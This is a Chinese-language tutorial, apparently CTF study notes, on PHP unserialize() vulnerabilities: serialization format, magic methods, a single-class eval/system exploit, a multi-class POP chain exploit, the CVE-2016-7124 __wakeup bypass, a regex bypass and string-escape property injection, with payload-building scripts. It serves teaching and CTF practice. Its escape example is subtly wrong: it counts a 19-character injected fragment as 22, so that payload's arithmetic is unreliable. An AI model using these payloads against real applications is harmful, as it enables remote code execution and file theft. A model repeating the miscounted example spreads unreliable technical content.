---

title: PHP反序列化
date: 2026-07-15
categories: [web安全, 常见漏洞]
type: tech
---




# 1. PHP 反序列化

反序列化就是把字符串还原成对象。如果这个字符串你能控制，就可能触发对象里的魔术方法执行恶意操作。POP链是它的核心攻击方式。
## 1.1 PHP 反序列化基础

### 1.1.1 序列化和反序列化概念

**序列化**：把 PHP 变量（对象、数组等）转化为可存储 / 传输的字符串。

**反序列化**：把序列化字符串还原成 PHP 变量。

简单示例：

```php
<?php
class User {
    public $name;

    public function __construct($name) {
        $this->name = $name;
    }
}

// 序列化 — 对象 → 字符串
$obj = new User('admin');
$str = serialize($obj);
echo $str;
// 输出: O:4:"User":1:{s:4:"name";s:5:"admin";}

// 反序列化 — 字符串 → 对象
$newObj = unserialize($str);
echo $newObj->name;  // admin
```

**漏洞本质：** 序列化本身没有安全问题，漏洞产生于 `unserialize()` 的参数**可控**，攻击者可以注入精心构造的对象，触发魔术方法执行恶意操作。

### 1.1.2 序列化字符串格式详解

每一种 PHP 数据类型在序列化后都有固定的表示格式。理解这些格式是读懂 payload 和后续手动修改序列化字符串的基础。

| 类型字母 | 含义 | 格式 | 举例 |
| -------- | ---------- | ------------------------------------------ | ------------------------------------------ |
| `s` | 字符串 | `s:长度:"内容";` | `s:5:"admin";` |
| `S` | 二进制字符串 | `S:长度:"内容";`（`\x00` 写作 `\00`） | `S:7:"\00*\00name";` |
| `i` | 整数 | `i:值;` | `i:123;` |
| `d` | 浮点数 | `d:值;` | `d:3.14;` |
| `b` | 布尔值 | `b:1;`（true）或 `b:0;`（false） | `b:1;` |
| `a` | 数组 | `a:长度:{键;值;...}` | `a:2:{i:0;s:1:"a";i:1;s:1:"b";}` |
| `O` | 普通对象 | `O:类名长度:"类名":属性个数:{...}` | `O:4:"User":1:{s:4:"name";s:5:"admin";}` |
| `C` | 自定义序列化对象 | `C:类名长度:"类名":数据长度:{数据}` | 实现 `Serializable` 接口的对象 |
| `N` | 空值 | `N;` | `N;` |
| `R` | 指针引用 | `R:序号;` | `R:2;`（指向序列化中第 2 个对象） |
| `r` | 值引用 | `r:序号;` | `r:1;`（指向序列化中第 1 个值） |

### 1.1.3 属性类型与可见性

PHP 类属性有三种可见性，用于控制"谁能访问这个属性"。序列化时 PHP 会通过**空字节 `\x00`** 来标记属性的可见性。

**三种可见性的作用：**

| 可见性 | 含义 | 谁能访问 |
| -------- | ---------------------------------- | -------------------------------- |
| public | 公开属性 | 任何地方都可以读写 |
| protected | 受保护属性 | 只有本类和子类内部可以读写 |
| private | 私有属性 | 只有本类内部可以读写，子类也不行 |

**在 CTF 反序列化中的实际影响：**

- `public` 属性在构造 exp 时可以直接赋值：`$obj->name = "admin"`。
- `protected` 和 `private` 属性**不能**在类的外部直接赋值，需要借助 `ReflectionClass` 或者手动修改序列化字符串。
- 题目经常用 protected/private 存放敏感字段（如 `$token`、`$isAdmin`），增加构造 payload 的难度。

**三种可见性的序列化格式：**

| 可见性 | 序列化后的属性名 | 举例 | 长度计算 |
| -------- | -------------------------------------- | ------------------------------------ | ------------------- |
| public | `name` | `s:4:"name";s:5:"admin";` | 原名长度 |
| protected | `\x00*\x00name` | `s:7:"\x00*\x00name";s:5:"admin";` | 原名长度 **+3** |
| private | `\x00类名\x00name` | `s:10:"\x00User\x00name";s:5:"admin";` | 原名长度 **+类名长度+2** |

**关键规律：**

- `public` 直接存储属性名，无额外标记。
- `protected` 在属性名前后各加 `\x00*` 和 `\x00`，长度 +3。
- `private` 在属性名前加 `\x00类名\x00`，长度 +类名长度+2。

**`\x00` 是什么？**

`\x00` 是 ASCII 码为 0 的空字节（Null Byte），它是一个**不可见的控制字符**——不是你眼睛看到的"反斜杠 x 零 零"这 4 个字符，而是实实在在的二进制 0。PHP 用它来包裹属性名，以此区分不同的可见性。

这个设计带来一个实际问题：`serialize()` 输出中包含的是真二进制空字节，在文本编辑器里**看不见也打不出来**。你复制粘贴时这些字节会丢失，导致序列化字符串失效。

**如何在文本中表示？—— 原始空字节与历史 `S` 标签**

PHP 原生 `serialize()` 始终使用小写 `s`，并把 NUL 作为真实字节写入结果。最稳妥的做法是用 PHP 脚本生成 payload，再用 URL 编码、Base64 或二进制安全工具传输。PHP 还历史性地接受大写 `S` 的转义字符串格式，可用可见的 `\00` 表示 NUL；但没有正式版本的原生序列化器输出过该格式，而且从 PHP 8.4 起，`unserialize()` 接受大写 `S` 已被弃用。

| | `s`（普通字符串，`serialize()` 默认输出） | `S`（二进制字符串，手动构造时使用） |
|---|---|---|
| `\x00` 的表现 | 真实的二进制空字节（不可见） | 历史转义形式 `\00` |
| 来源 | `serialize()` 的标准输出 | 手工构造的兼容格式 |
| 版本状态 | 当前标准格式 | PHP 8.4 起弃用，不能面向未来版本依赖 |

**举例：**

PHP 自动序列化一个 protected 属性时，按可见转义记号可以写成：

```text
s:7:"\x00*\x00name";    ← 这里的 \x00 表示真实 NUL，不是四个可见字符
```

直接经过不支持 NUL 的文本通道可能损坏 payload；二进制安全复制或先做 URL/Base64 编码则不会。

旧题中也可能看到用 `S` 类型改写、把 NUL 表示为可见 `\00` 的手工 payload：

```text
// protected $name = "admin"
S:7:"\00*\00name";s:5:"admin";

// private $name = "admin"（类名为 User）
S:10:"\00User\00name";s:5:"admin";
```

在仍兼容大写 `S` 的旧版本中，它可得到相同属性名；PHP 8.4 会产生弃用提示，未来版本可能移除支持。因此它是历史技巧，不是构造 protected/private 属性的必需方式。

**如何构造 protected / private 属性的 payload？**

了解了序列化格式之后，实际构造 exp 时还有一个问题：`public` 属性可以直接 `$obj->name = "admin"` 赋值，但 `protected` 和 `private` 属性在类的外部**不能直接访问**。

有两种方法可以解决：

**方法一：使用 `ReflectionClass`（推荐）**

```php
<?php
class Target {
    protected $token = "default";
    private $admin = false;
}

$obj = new Target();                              // ①

$ref = new ReflectionClass($obj);                 // ②

// 修改 protected 属性
$propToken = $ref->getProperty('token');          // ③
$propToken->setAccessible(true);                  // ④ PHP 8.0 及之前需要；8.1+ 无效果
$propToken->setValue($obj, 'QCCTFyyds');          // ⑤

// 修改 private 属性
$propAdmin = $ref->getProperty('admin');          // ⑥
$propAdmin->setAccessible(true);                  // ⑦ 同上
$propAdmin->setValue($obj, true);                 // ⑧

echo serialize($obj);                             // ⑨
```

**逐行解释：**

**① `new Target()`** — 正常创建对象，此时 `$obj` 的属性是默认值：`$token = "default"`，`$admin = false`。

**② `new ReflectionClass($obj)`** — 创建 `ReflectionClass` 实例。Reflection（反射）是 PHP 的一种内省机制，允许你在运行时**查看和操作类/对象的内部结构**。拿到这个对象后，可以访问它的一切——包括被 protected/private 隐藏的属性。

**③ `$ref->getProperty('token')`** — 获取 `Target` 类中名为 `token` 的属性对象（`ReflectionProperty`）。注意这里传的是属性的**原始名称** `"token"`，不是序列化后的 `"\x00*\x00token"`——Reflection 会帮你处理可见性。

**④ `setAccessible(true)`** — PHP 8.0 及之前，反射读写非公有属性前需要调用；PHP 8.1 起所有属性对 Reflection API 默认可访问，该调用不再产生效果，并在 PHP 8.5 起弃用。为了兼容较老 CTF 环境，示例暂时保留这一行。

**⑤ `setValue($obj, 'QCCTFyyds')`** — 将 `$obj` 的 `token` 属性的值改为 `'QCCTFyyds'`。此时 `$obj->token` 已经是新值了（虽然在类外仍然不能直接 `$obj->token` 来读取，但值已经写入对象内部）。

**⑥ `getProperty('admin')`** — 获取 `admin` 属性。虽然是 private，`getProperty()` 照样能找到。

**⑦ `setAccessible(true)`** — 版本条件同第 ④ 步。

**⑧ `setValue($obj, true)`** — 将 `$admin` 改为 `true`。

**⑨ `serialize($obj)`** — 序列化输出。结果类似：

```text
O:6:"Target":2:{s:8:"\x00*\x00token";s:9:"QCCTFyyds";s:13:"\x00Target\x00admin";b:1;}
```

上面为了可读性用 `\x00` 标出 NUL；真实 `serialize()` 结果中这些位置是 `00` 字节。protected 属性使用 `NUL * NUL` 前缀，private 属性使用 `NUL 类名 NUL` 前缀。

**为什么不能直接 `$obj->token = 'QCCTFyyds'` ？**

因为 `$token` 是 `protected`，在**类的外部**（不在 `Target` 类或其子类内部）直接访问会被 PHP 拦截并报错：

```text
Fatal error: Cannot access protected property Target::$token
```

所以不能用普通属性访问语法直接赋值；可以借助 Reflection API，或在二进制安全前提下构造序列化数据。

**方法二：手动修改序列化字符串**

直接用编辑器修改序列化后的字符串，把对应属性的值替换掉，然后调整长度声明。

```text
// 历史 S 标签写法（token 为 "default"）
S:8:"\00*\00token";s:7:"default";

// 手动改为 "QCCTFyyds"，注意修改长度 7 → 9
S:8:"\00*\00token";s:9:"QCCTFyyds";
```

这种历史写法不需要插入真实 NUL，但容易出错，且 PHP 8.4 起弃用大写 `S`。现代环境优先让相同版本的 PHP 生成标准小写 `s` payload，再对原始字节编码传输。

## 1.2 PHP 反序列化核心函数

### 1.2.1 `serialize()`

`serialize()` 将 PHP 变量转换为序列化字符串。通常用于调试、缓存或在构造 exp 时生成 payload。

```php
<?php
$data = ["name" => "admin", "role" => "user"];
echo serialize($data);
// a:2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
```

**注意：** 对象自定义序列化时，PHP 7.4+ 优先使用 `__serialize()`；否则还可能使用 `Serializable::serialize()` 或 `__sleep()`。这些钩子会改变最终序列化结果，不能只按可见属性手算。

### 1.2.2 `unserialize()`

`unserialize()` 将序列化字符串还原为 PHP 变量。**当参数可控时，这就是反序列化漏洞的入口。**

```php
<?php
$data = unserialize($_GET['data']);  // 危险 — 用户输入直接反序列化
```

**`unserialize()` 的执行流程：**

1. 解析序列化字符串，创建对象实例。
2. 将字符串中声明的属性值写入对象。
3. 对每个创建的对象调用 `__wakeup()`（或 PHP 7.4+ 的 `__unserialize()`）。
4. 返回还原后的对象。

**`unserialize()` 常见入参位置：**

| 入参来源 | 示例代码 |
| --------------- | ------------------------------------ |
| GET / POST 参数 | `unserialize($_GET['data'])` |
| Cookie | `unserialize($_COOKIE['data'])` |
| Session 数据 | `unserialize($_SESSION['data'])` |
| 文件读取 | `unserialize(file_get_contents($f))` |
| phar 元数据 | PHP 7 及之前打开归档时自动触发；PHP 8 起需显式取 metadata（见 16.6.6） |

## 1.3 PHP 反序列化常见魔术方法

### 1.3.1 魔术方法总览

魔术方法（Magic Methods）是 PHP 在特定时机**自动调用**的特殊方法，均以 `__` 开头。反序列化利用的实质就是通过控制对象属性，让魔术方法在自动触发时执行攻击者预期的操作。

| 魔术方法 | 触发条件 | 反序列化中的常见角色 |
| ------------------------ | ----------------------------------------- | ------------------------ |
| `__construct()` | `new` 创建对象时 | 构造函数，反序列化不触发 |
| `__destruct()` | 对象销毁时（脚本结束 / 显式 `unset()`） | **POP 链入口（最常用）** |
| `__wakeup()` | `unserialize()` 完成后 | POP 链入口 / 被绕过目标 |
| `__unserialize()` | `unserialize()` 完成后（PHP 7.4+） | 替代 `__wakeup()` |
| `__sleep()` | `serialize()` 时 | 序列化前的清理 |
| `__serialize()` | `serialize()` 时（PHP 7.4+） | 替代 `__sleep()` |
| `__toString()` | 对象被当作字符串使用时（`echo`、`"$obj"`） | POP 链中间跳板 |
| `__call()` | 调用对象上不存在的方法时 | POP 链中间跳板 |
| `__callStatic()` | 调用类上不存在的静态方法时 | 较少用于反序列化 |
| `__get()` | 访问不存在或不可访问的属性时 | POP 链中间跳板 |
| `__set()` | 给不存在或不可访问的属性赋值时 | POP 链中间跳板 |
| `__isset()` | 对不存在属性使用 `isset()` / `empty()` 时 | POP 链中间跳板 |
| `__unset()` | 对不存在属性使用 `unset()` 时 | 较少用于反序列化 |
| `__invoke()` | 对象被当作函数调用时（`$obj()`） | POP 链中间跳板 |
| `__set_state()` | `var_export()` 导出时 | 较少用于反序列化 |
| `__clone()` | `clone` 对象时 | 较少用于反序列化 |
| `__debugInfo()` | `var_dump()` 时 | 较少用于反序列化 |

### 1.3.2 重点魔术方法详解

在 CTF 反序列化题目中，最常被利用的魔术方法有以下几类：

**① `__destruct()` — 最重要的 POP 链入口**

对象在正常销毁时会调用 `__destruct()`，脚本结束是常见触发点，因此它经常作为 POP 链入口。但不能写成"反序列化成功就一定触发"：进程被强制终止、反序列化过程中抛错、对象未完整构造或某些致命退出路径都可能影响析构调用与回显。

```php
class A {
    public $cmd;
    public function __destruct() {
        system($this->cmd);  // 若 $cmd 可控 → RCE
    }
}
```

**② `__wakeup()` — 反序列化后立即触发**

在 `unserialize()` 完成后自动调用。常用于题目中"重置"危险属性，需要先绕过它（见 16.6.1）。

```php
class B {
    public $isAdmin = false;
    public function __wakeup() {
        $this->isAdmin = false;  // 强制重置，需要绕过
    }
}
```

**③ `__toString()` — 当对象被当作字符串使用**

触发条件极多：`echo $obj`、`"$obj"`、`strval($obj)`、字符串拼接 `"hello" . $obj`、`preg_match()` 传入对象作为 subject 等。

```php
class C {
    public $content;
    public function __toString() {
        return file_get_contents($this->content);  // 读取任意文件
    }
}
```

**④ `__call($name, $args)` — 调用不存在的方法**

`$name` 是调用的方法名，`$args` 是参数数组。典型触发场景：`$this->obj->noExistMethod()`。

**⑤ `__get($name)` — 访问不存在的属性**

`$name` 是被访问的属性名。典型触发：`$this->obj->noExistProp`。

**⑥ `__set($name, $value)` — 给不存在的属性赋值**

触发场景：`$this->obj->noExistProp = "value"`。

**⑦ `__invoke()` — 把对象当函数调用**

触发场景：`($this->obj)()` 或 `call_user_func($this->obj)`。

## 1.4 普通反序列化

普通反序列化是指：**不依赖多个类之间互相调用**，只需要修改一个对象的属性，就能直接触发魔术方法走到危险函数的利用方式。

与 POP 链（16.5 节）的区别在于 —— POP 链需要嵌套多个对象让魔术方法串联触发，而普通反序列化通常只需要操作一个类。

### 1.4.1 典型场景

普通反序列化需要满足三个条件：

1. `unserialize()` 参数可控。
2. 类中有魔术方法（通常是 `__destruct()` 或 `__wakeup()`）。
3. 魔术方法中存在危险操作，且行为由对象属性控制。

### 1.4.2 例题

源码如下：

```php
<?php
class ShowFlag {
    public $show = false;
    public $code;

    public function __destruct() {
        if ($this->show) {
            eval($this->code);
        }
    }
}

if (isset($_COOKIE['data'])) {
    unserialize($_COOKIE['data']);
}
?>
```

#### 1.4.2.1 分析

反序列化入口为 `$_COOKIE['data']`，唯一可利用的方法是 `ShowFlag::__destruct()`：

- 当对象销毁时自动触发。
- 若 `$this->show` 为 `true`，执行 `eval($this->code)`。
- `$this->code` 的内容完全由反序列化控制。

这就是典型的普通反序列化：无需链式调用，直接修改 `ShowFlag` 的两个属性即可。

#### 1.4.2.2 构造 exp

```php
<?php
class ShowFlag {
    public $show = true;
    public $code = 'system("cat /flag");';
}

$obj = new ShowFlag();
echo serialize($obj);
```

序列化结果：

```text
O:8:"ShowFlag":2:{s:4:"show";b:1;s:4:"code";s:20:"system("cat /flag");";}
```

#### 1.4.2.3 传入 payload

由于通过 Cookie 传入，`;` 需要 URL 编码。将 payload 编码后放入 `Cookie: data=...`，访问页面即可在 `__destruct()` 触发时拿到 flag。

#### 1.4.2.4 普通反序列化 vs POP 链 总结

| 类型 | 涉及类数量 | 难度 | 关键点 |
| ---------- | ---------- | ---- | ------------------------------------ |
| 普通反序列化 | 1 个 | 较低 | 修改单个对象的属性直接触发魔术方法 |
| POP 链 | 多个 | 较高 | 嵌套多个对象，让魔术方法按顺序串联触发 |

## 1.5 POP 链反序列化

### 1.5.1 POP 链概念

POP 链全称是 Property-Oriented Programming。

与普通反序列化（见 16.4）的区别在于：普通反序列化只需要修改一个对象的属性，直接触发它的魔术方法；而 POP 链需要把**多个对象嵌套起来**，让它们按顺序互相调用，最终走到危险函数。

### 1.5.2 POP 链构造思路

1. 找反序列化入口。

先找源码中的：

```text
unserialize()
```

只要传入 `unserialize()` 的参数可控，就可以尝试构造对象。

1. 分析入口参数限制。

有些题目可能会对传入 `unserialize()` 的可控参数做限制，需要具体题目具体分析。

1. 找链子终点。

终点一般是能读取 flag 或执行命令的地方，例如：

```php
echo $GLOBALS['flag'];
system($this->cmd);
eval($this->code);
highlight_file($this->file);
file_get_contents($this->file);
```

找到终点后，先判断需要控制哪些属性、满足哪些条件。

1. 往上找触发点。

根据终点所在的方法，反推哪里能触发它：

```php
echo $this->a;          // 触发 __toString()
$this->a->b;            // 触发 __get()
$this->a->b = "test";   // 触发 __set()
$this->a->b();          // 触发 __call()
($this->a)();           // 触发 __invoke()
isset($this->a->b);     // 触发 __isset()
```

比如终点在：

```php
public function __toString() {
    return $GLOBALS['flag'];
}
```

那就要往上找哪里把对象当成字符串使用，例如：

```php
echo $this->obj;
```

如果 `$this->obj` 是这个类的对象，就会触发它的 `__toString()`。

1. 继续重复往上找触发点。

重复上述步骤，直到找到整个 POP 链的入口方法。

1. 找到链子入口处。

POP 链最后要能从反序列化自动开始，所以常见入口是：

```text
__wakeup()
__destruct()
```

`__wakeup()` 会在 `unserialize()` 后自动触发。

`__destruct()` 会在对象销毁时自动触发。

1. 总结调用链。

把整个触发过程理清楚，例如：

```text
A::__destruct()
→ B::__toString()
→ C::__get()
→ D::__invoke()
→ system("cat /flag")
```

1. 构造 exp。

根据调用链编写 exp，并设置对象属性。

### 1.5.3 POP 链反序列化例题

例题源码：

```php
<?php
$flag = file_get_contents("/flag");

class Fracture {
    public $delegate;

    public function __destruct() {
        if ($this->delegate) {
            $this->delegate->disperse();
        }
    }
}

class Specter {
    public $latch = false;

    public function __toString() {
        if ($this->latch) {
            return $GLOBALS['flag'];
        }
        return "no";
    }
}

class Thunk {
    public $operand;

    public function __invoke() {
        echo $this->operand;
    }
}

class Conduit {
    public $handler;

    public function disperse() {
        $f = $this->handler;
        return $f();
    }
}

highlight_file(__FILE__);

if (isset($_COOKIE['data'])) {
    unserialize($_COOKIE['data']);
}
?>
```

#### 1.5.3.1 找反序列化入口

找到源码中的：

```php
if (isset($_COOKIE['data'])) {
    unserialize($_COOKIE['data']);
}
```

其中 `$_COOKIE['data']` 就是我们的可控参数，也就是反序列化入口。

#### 1.5.3.2 分析入口参数限制

由于是 `Cookie` 传参，分号 `;` 会被解析成两个 `Cookie` 值的分隔号，所以最终 payload 需要进行 URL 编码。

#### 1.5.3.3 找链子终点

终点位于：

```php
class Specter {
    public $latch = false;

    public function __toString() {
        if ($this->latch) {
            return $GLOBALS['flag'];
        }
        return "no";
    }
}
```

所以实现 `return $GLOBALS['flag']` 需要满足：

1. `$this->latch` 为真。
2. 触发 `Specter::__toString()`。

#### 1.5.3.4 往上找触发点

反推哪里能触发 `Specter::__toString()`，需要实现类似：

```php
echo $this->a;
```

找到：

```php
class Thunk {
    public $operand;

    public function __invoke() {
        echo $this->operand;
    }
}
```

所以触发 `Specter::__toString()` 需要满足：

1. 触发 `Thunk::__invoke()`。
2. `$this->operand` 为 `Specter` 对象。

#### 1.5.3.5 继续往上找触发点

反推哪里能触发 `Thunk::__invoke()`，需要实现类似：

```php
($this->a)();
```

找到：

```php
class Conduit {
    public $handler;

    public function disperse() {
        $f = $this->handler;
        return $f();
    }
}
```

所以触发 `Thunk::__invoke()` 需要满足：

1. 触发 `Conduit::disperse()`。
2. `$this->handler` 为 `Thunk` 对象。

#### 1.5.3.6 找到链子入口处

反推哪里能触发 `Conduit::disperse()`。

找到：

```php
class Fracture {
    public $delegate;

    public function __destruct() {
        if ($this->delegate) {
            $this->delegate->disperse();
        }
    }
}
```

由于这部分的魔术方法为 `Fracture::__destruct()`，可以直接作为 POP 链入口。

所以触发 `Conduit::disperse()` 需要满足：

1. 触发 `Fracture::__destruct()`。
2. `$this->delegate` 为 `Conduit` 对象。

#### 1.5.3.7 总结调用链

把整个触发过程理清楚：

```php
Fracture::__destruct()
→ Conduit::disperse()
→ Thunk::__invoke()
→ Specter::__toString()
→ return $GLOBALS['flag']
```

#### 1.5.3.8 构造 exp

先在 exp 中写好所有要用到的类，并把属性的值修改成我们需要的：

```php
<?php
class Fracture {
    public $delegate;
}

class Specter {
    public $latch = true;
}

class Thunk {
    public $operand;
}

class Conduit {
    public $handler;
}
```

接着设置一个对象 `$a`，按调用链的顺序完成 POP 链：

```php
$a = new Fracture();
$a->delegate = new Conduit();
$a->delegate->handler = new Thunk();
$a->delegate->handler->operand = new Specter();
```

最后将对象 `$a` 进行序列化。

由于前面分析入口参数限制时提到，payload 结果需要进行 URL 编码，所以：

```php
echo urlencode(serialize($a));
```

完整 exp：

```php
<?php
class Fracture {
    public $delegate;
}

class Specter {
    public $latch = true;
}

class Thunk {
    public $operand;
}

class Conduit {
    public $handler;
}

$a = new Fracture();
$a->delegate = new Conduit();
$a->delegate->handler = new Thunk();
$a->delegate->handler->operand = new Specter();

echo urlencode(serialize($a));
```

运行该 PHP 脚本得到 payload 后，通过 `$_COOKIE['data']` 传入即可。

## 1.6 PHP 反序列化常见绕过与进阶技巧

### 1.6.1 `__wakeup()` 绕过（CVE-2016-7124）

`__wakeup()` 会在 `unserialize()` 后自动触发，常用于在题目中重置对象属性，阻止攻击者构造的恶意值生效。

**漏洞原理（CVE-2016-7124）：** 当序列化字符串中对象的属性数量**大于**实际属性数量时，`__wakeup()` 会被跳过。

**受影响版本：** 所有小于以下修复版本的 PHP 均受影响：

| 版本线 | 受影响范围 | 修复版本 |
| -------- | ----------------- | ---------- |
| PHP 5.x | ≤ 5.6.24 | 5.6.25 |
| PHP 7.0 | 7.0.0 ~ 7.0.9 | 7.0.10 |

7.1.0 及以上版本不受影响。

> **注意：** PHP 5.6 和 7.0 是并行维护的两条版本线（7.0 发布后 5.6 仍在更新），所以有两个独立的受影响区间和修复版本。另外 PHP 6 从未正式发布——2010 年因开发困难被放弃，计划中的 Unicode 支持等特性被打散并入了 5.3.x 和后来的 7.0，所以版本号直接从 5.x 跳到了 7.0。

**绕过方法：** 修改对象头的属性数量为大于真实值。

**示例：**

```php
class Example {
    public $name = "guest";

    public function __wakeup() {
        $this->name = "guest";  // 强制重置
    }

    public function __destruct() {
        if ($this->name === "admin") {
            echo $GLOBALS['flag'];  // 读取 flag
        }
    }
}
```

正常序列化结果（属性数 = 1）：

```text
O:7:"Example":1:{s:4:"name";s:5:"admin";}
```

将属性个数改为 `2`（大于实际值）：

```text
O:7:"Example":2:{s:4:"name";s:5:"admin";}
```

这样 `__wakeup()` 被跳过，`$this->name` 保持为 `admin`，`__destruct()` 即可输出 flag。

**代码中修改属性数：**

```php
$payload = serialize($obj);
$payload = str_replace('O:7:"Example":1:', 'O:7:"Example":2:', $payload);
```

### 1.6.2 正则格式绕过 —— `O:+数字`

有些题目使用正则来拦截对象格式的序列化字符串。

**常见拦截正则：**

```php
if (preg_match('/[oc]:\d+:/i', $data)) {
    die("No objects allowed");
}
```

**绕过原理：** 一些旧版 PHP（例如 PHP 5.6）的 `unserialize()` 接受对象头中的 `O:+数字:`（`+` 作为正整数符号），但正则 `[oc]:\d+:` 匹配不到带 `+` 号的情况，因为 `\d+` 只匹配纯数字。PHP 8 的对象类名长度只接受无符号十进制数字，下面的 `O:+数字:` 会解析失败。

**示例：**

```text
// 正常格式 — 被拦截
O:9:"ShowFlag":1:{s:4:"show";b:1;}

// 旧版 PHP 绕过格式 — 正则放行；能否解析取决于目标 PHP 版本
O:+9:"ShowFlag":1:{s:4:"show";b:1;}
```

**构造方法：**

```php
$s = serialize($obj);
$s = str_replace('O:', 'O:+', $s);
```

**注意：** 在同样接受带正号长度的旧版解析器中，`C:+数字:` 也可能绕过该正则；PHP 8 对 `O:`、`C:` 的类名长度都不接受正号。使用前必须在与目标一致的 PHP 版本上验证。

### 1.6.3 字符过滤与序列化逃逸

当题目在 `unserialize()` 之前对输入做了字符替换（`str_replace` / `preg_replace`），序列化字符串中的**长度声明**和**实际内容**之间就会产生偏差。根据过滤效果，分以下三种情况：

---

#### 1.6.3.1 情况一：过滤后内容变短 — 手动修正长度

典型代码：

```php
$data = str_replace("flag", "", $_GET['data']);  // "flag" 四个字符被删掉
$obj = unserialize($data);
```

**问题：** 假设想传入 `get_flag`，但 `flag` 会被删掉变成 `get_`。于是用双写绕过，写入 `get_flflagag`。序列化后是 `s:12:"get_flflagag";`，经过 `str_replace` 变成 `s:12:"get_flag";`——长度声明 12，实际只有 8 个字符，反序列化直接报错。

**解决：** 既然过滤后只剩 8 个字符，那**在传给服务端之前，提前把长度改成 8**：

```php
$obj->name = "get_flflagag";
$payload = serialize($obj);
// 得到：s:12:"get_flflagag";  ← 长度 12
// 手动改成 8：
$payload = str_replace('s:12:"get_flflagag"', 's:8:"get_flflagag"', $payload);
// 传给服务端 → str_replace 删掉 flag → s:8:"get_flag";  ← 8=8，正确！
```

一句话总结：**过滤让内容变短了，就提前把长度声明也改短。**

---

#### 1.6.3.2 情况二：过滤后内容变长 — 字符串逃逸注入属性

这是序列化逃逸的**核心技巧**。当过滤把短字符替换为长字符时，多出来的字符会"溢出"当前属性，被你精心构造的注入内容接住，变成新的序列化属性。

**典型代码：**

```php
// 开发者写了一个"输入过滤器"，本意是把下划线替换为双下划线
// 来阻止某种注入。但过滤器反而让序列化字符串膨胀，引入了逃逸漏洞。
function filter($str) {
    return str_replace("_", "__", $str);  // 1 个 _ → 2 个 _
}
$data = filter($_GET['data']);
$obj = unserialize($data);
```

**直观理解"逃逸"：**

序列化字符串就像一个带标签的箱子。标签上写着"里面装了 5 个字符"，PHP 就严格按 5 个来取：

```
原始传入：s:5:"_____";
              ↑   └─箱子里 5 个 _
           标签：取 5 个
```

经过过滤，每个 `_` 变成 `__`，箱子里的东西膨胀了：

```
过滤后：  s:5:"__________";
              ↑   └─实际 10 个 _，膨胀了！
           标签：还是取 5 个
```

但 PHP 不看实际有多少——它只认标签上的数字 **5**。于是它取出前 5 个 `_`，剩下的 5 个 `_` 连带后面的 `";}` 就"逃逸"出去了，变成了序列化引擎接下来要解析的内容。

**如果我们能在"剩下的部分"里提前写好想注入的属性，这些属性就会被 PHP 正常解析，嫁接到对象上。**

---

**例题：用户只能控制 name 字段，逃逸是唯一出路**

**题目源码：**

```php
<?php
// index.php
class User {
    public $name;
    public $user_role = "guest";   // 属性名含 _，会被 filter 破坏
    public $user_group = "normal"; // 属性名含 _，会被 filter 破坏

    public function __destruct() {
        // 检查的是 admin（不含 _），不受 filter 影响
        if (isset($this->admin) && $this->admin === true) {
            echo file_get_contents('/flag');
        }
    }
}

function filter($str) {
    return str_replace("_", "__", $str);  // 1 个 _ → 2 个 _
}

// 关键：用户只能控制 name 字段的值，整个对象结构和其余属性由服务端生成
$user = new User();
$user->name = $_GET['name'];
$data = filter(serialize($user));
unserialize($data);
```

**这道题为什么不能直接传 `admin`？**

用户控制的只有 `$_GET['name']`——一个字符串，最终变成 `name` 属性的**值**。你传 `?name=admin`，进到序列化里是 `s:5:"admin"`（name 的值是字符串 `"admin"`），不是属性声明 `s:5:"admin";b:1;`。

你无法在 `?name=` 里添加一个新的对象属性，因为整个序列化结构是服务端 `serialize()` 生成的：

```
服务端生成的结构：O:4:"User":3:{s:4:"name";s:N:"<你的输入>";s:9:"user_role";...}
                                  ↑               ↑                 ↑
                             固定的属性名    你只能填这里    服务端强制的其余属性
```

更致命的是，即使你不做任何攻击，正常输入 `?name=hello`，服务端生成的序列化也会被 `filter()` 破坏——`user_role` 变成 `user__role`，长度不匹配，反序列化直接报错。

**但 `name` 的值也会被 filter 膨胀。这就是刀口。** 我们在 `name` 里埋入精心计算的 `_` 序列，膨胀后刚好"吞掉"后面的 `user_role` 等破坏属性，同时在尾部藏一个 `admin=true`，让它作为新属性露出来。

---

**利用过程：**

**① 确定要注入的内容**

我们需要从 `name` 的字符串值里"逃逸"出去，闭合 `name`，声明 `admin=true`，闭合对象：

```

";s:5:"admin";b:1;}
```

- `"` `;` — 闭合 `name` 的字符串、结束属性声明
- `s:5:"admin";` — 声明新属性 `admin`（5 字符，不含 `_`）
- `b:1;` — 布尔 `true`
- `}` — 闭合对象

整段共 **22** 字符，不含 `_`，不被 filter 影响。

**② 计算需要多少个 `_`**

每个 `_` → `__`，多 1 字符。需要逃逸 22 字符 → 需要 **22 个 `_`**。过滤后 22→44 个，PHP 取前 22 个，剩 22 个覆盖注入片段。

**③ 组装 name 的值**

```
name = ______________________";s:5:"admin";b:1;}
       └─── 22个_ ───┘└─── 22个注入字符 ───┘
```

总共 44 字符。服务端序列化后：`s:44:"______________________";s:5:"admin";b:1;}"`。

**④ 看过滤前后变化**

```
传给 filter（过滤前）：
...s:44:"______________________";s:5:"admin";b:1;}";s:9:"user_role";s:5:"guest";...}
          └─ 22个_ ─┘└─ 22个注入 ─┘└──────── 会被破坏的其余属性 ──────────┘

filter 把 _ → __ 后：
...s:44:"____________________________________________";s:5:"admin";b:1;}";s:9:"user__role";...}
          └──── 44个_，全取完 ────┘└─ 注入属性 ─┘└─ 垃圾（被 } 截断，不再解析）─┘
```

PHP 按标签取 44 个字符——全部 44 个 `_`。然后 `";s:5:"admin";b:1;}` 被解析为 `admin=true`，`}` 关闭对象。后面的 `user__role` 在垃圾区，不解析。

**⑤ 请求**

```text
?name=______________________%22%3Bs%3A5%3A%22admin%22%3Bb%3A1%3B%7D
      └─── 22个_ ───┘└────────── 注入片段 URL 编码 ──────────┘
```

**核心公式：** 需要逃逸的字符数 = 注入片段的长度，需要的填充字符数 = 注入片段长度 ÷ 每个字符过滤后多出的字符数。

---

**补充：反向逃逸（过滤变短）**

如果过滤让内容变短（如 `str_replace("__", "_", ...)`，和前面方向相反），则当前属性的值"缩水"了，标签说取 10 个但实际只剩 5 个——PHP 会把后续结构的一部分**吞进**当前属性的值里。利用方式是在被吞的区域前放一个牺牲属性，让它的值恰好把注入片段"挤"到外面。

---

#### 1.6.3.3 情况三：关键字检测绕过（非逃逸）

这不是序列化逃逸，而是针对 `strpos`、`stripos` 等字符串匹配函数的简单绕过：

```php
// 题目检测 payload 中是否包含 "flag" 字样
if (stripos($code, "flag") !== false) { die("hacker!"); }
eval($code);
```

